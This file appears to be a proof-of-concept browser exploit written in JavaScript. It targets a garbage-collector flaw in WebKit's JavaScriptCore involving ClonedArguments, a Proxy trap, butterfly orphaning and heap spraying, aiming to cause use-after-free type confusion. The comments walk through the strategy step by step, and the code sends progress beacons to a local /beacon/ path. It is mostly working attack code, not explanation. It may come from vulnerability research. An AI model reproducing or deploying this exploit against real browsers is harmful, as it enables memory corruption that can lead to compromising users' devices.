// p280 - ClonedArguments type confusion via untraced auxiliary cell
//
// Key insight from source analysis (SlotVisitor.cpp:202-220):
// Conservative GC pins orphaned butterfly cells but does NOT trace JSValues inside.
// noteLiveAuxiliaryCell (line 306-324) only marks the cell, no content scanning.
//
// Strategy:
// 1. Create victim objects (e.g., objects with valueOf) as arguments
// 2. Proxy trap on hole: orphan old butterfly (convert to ArrayStorage)
// 3. Clear victim refs from NEW butterfly (self[i] = null for indices after hole)
// 4. GC: old butterfly pinned, but victims NOT traced -> victims freed
// 5. Spray same size class with different-typed objects (e.g., arrays with controlled length)
// 6. copyToArguments reads stale JSValues from old butterfly -> type confusion
// 7. Callee receives spray objects in place of victims
//
// Beacon prefix: V280-

(function() {
  function B(tag, body) {
    try {
      navigator.sendBeacon('/beacon/V280-' + tag + '?t=' + Date.now(), body || '');
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function attempt(round) {
    // Create victim objects: plain objects that we can identify
    // Each victim is a unique object with a marker property
    var victims = [];
    for (var i = 0; i < 20; i++) {
      victims.push({
        marker: 0xDEAD0000 + i,
        idx: i,
        pad1: 'padding' + i,
        pad2: i * 3.14
      });
    }

    // Also create recognizable spray objects of same cell size
    // These have a completely different shape (array-like with length property)
    function SprayObj(id) {
      this.type = 'SPRAY';
      this.id = id;
      this.pad1 = 0xCAFE0000 + id;
      this.pad2 = 'spray' + id;
    }

    function mkArgs() { return arguments; }
    function receiver() { return Array.prototype.slice.call(arguments); }

    // Pass victims as arguments (indices 0-19), put hole at index 2
    var args = mkArgs.apply(null, victims);
    delete args[2]; // Create hole at index 2
    B('R' + round + '-ARGS-' + args.length);

    var trapFired = false;
    var self = args;
    var sprayObjs = [];

    Object.setPrototypeOf(args, new Proxy({}, {
      get: function(t, prop) {
        if (trapFired) return 0xFACE;
        if (prop !== '2') return undefined;
        trapFired = true;
        B('R' + round + '-TRAP');

        try {
          // Step 1: Orphan old butterfly
          // Convert to ArrayStorage which allocates a new butterfly
          self[0x7fffffff] = 1;
          delete self[0x7fffffff];
          B('R' + round + '-ORPHANED');

          // Step 2: Clear victim references from the NEW butterfly
          // The new ArrayStorage butterfly holds the same values
          // Set indices 3-19 to null (keep 0,1 as they're already written to callee stack)
          for (var i = 3; i < 20; i++) {
            self[i] = null;
          }
          B('R' + round + '-CLEARED');

          // Step 3: Also clear the victims array itself
          for (var i = 0; i < victims.length; i++) {
            victims[i] = null;
          }
          victims = null;

          // Step 4: GC pressure to collect the unreachable victim objects
          // Old butterfly is pinned (conservative), but victims inside are NOT traced
          var junk;
          for (var g = 0; g < 50; g++) {
            junk = new Array(10000);
            for (var k = 0; k < 10000; k++) {
              junk[k] = {x: k, y: String(k)};
            }
          }
          junk = null;
          for (var g2 = 0; g2 < 30; g2++) {
            junk = new Array(10000);
            for (var k2 = 0; k2 < 10000; k2++) {
              junk[k2] = {a: k2};
            }
          }
          junk = null;
          B('R' + round + '-GC-800K');

          // Step 5: Spray same size class objects to reclaim victim cells
          // Victims were plain {marker, idx, pad1, pad2} objects
          // Cell size depends on property count, estimate 64 bytes per cell
          // Spray with SprayObj which has same property count but different shape
          for (var s = 0; s < 5000; s++) {
            sprayObjs.push(new SprayObj(s));
          }
          B('R' + round + '-SPRAY-' + sprayObjs.length);

        } catch(e) {
          B('R' + round + '-TRAP-ERR-' + e.message.substring(0, 40));
        }

        return 0xBEEF;
      }
    }));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch(e) {
      B('R' + round + '-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return; }
    B('R' + round + '-LEN-' + result.length);

    // Analyze: indices 3-19 should have had victims, now may have spray objects
    var confuseCount = 0;
    var nullCount = 0;
    var victimCount = 0;
    var vals = [];

    for (var i = 0; i < Math.min(result.length, 20); i++) {
      var v = result[i];
      if (v === null || v === undefined) {
        vals.push(i + '=null');
        nullCount++;
      } else if (typeof v === 'object' && v !== null) {
        if (v.type === 'SPRAY') {
          confuseCount++;
          vals.push(i + '=SPRAY:' + v.id);
        } else if (v.marker !== undefined) {
          victimCount++;
          vals.push(i + '=VICTIM:' + hex(v.marker));
        } else {
          vals.push(i + '=OBJ:' + Object.keys(v).join(','));
          confuseCount++;
        }
      } else if (typeof v === 'number') {
        vals.push(i + '=N:' + hex(v >>> 0));
      } else {
        vals.push(i + '=T:' + typeof v);
      }
    }

    B('R' + round + '-VALS', vals.join(' '));
    B('R' + round + '-CONFUSE-' + confuseCount + '-NULL-' + nullCount + '-VICTIM-' + victimCount);

    if (confuseCount > 0) {
      B('R' + round + '-TYPE-CONFUSION-HIT');

      // Detailed analysis of confused entries
      for (var i = 3; i < Math.min(result.length, 20); i++) {
        var cv = result[i];
        if (cv && typeof cv === 'object' && cv.type === 'SPRAY') {
          B('R' + round + '-SPRAY-AT-' + i + '-ID-' + cv.id);
        } else if (cv && typeof cv === 'object' && cv.marker === undefined) {
          // Unknown object type - might be partially corrupted
          try {
            var keys = Object.keys(cv);
            B('R' + round + '-UNKNOWN-AT-' + i + '-KEYS-' + keys.slice(0, 5).join(','));
          } catch(e) {
            B('R' + round + '-CORRUPT-AT-' + i + '-ERR');
          }
        }
      }
    }
  }

  for (var r = 0; r < 3; r++) {
    try {
      attempt(r);
    } catch(e) {
      B('R' + r + '-ERR-' + e.message.substring(0, 60));
    }
  }

  B('DONE');
})();
